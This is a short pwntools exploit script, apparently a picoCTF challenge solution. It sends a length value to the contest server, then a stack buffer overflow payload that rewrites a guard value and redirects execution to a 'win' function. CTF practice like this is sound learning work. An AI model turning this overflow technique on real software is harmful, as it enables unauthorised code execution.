from pwn import*

p = remote("saturn.picoctf.net", 62177)
#p = process("./vuln")
#gdb.attach(p, api=True)
p.sendline(b"90")

win = 0x08049336
payload = b"\x00"*0x40 + p32(0x64526942) +b"a"*0x10 + p32(win) 
p.sendline(payload)
p.interactive()
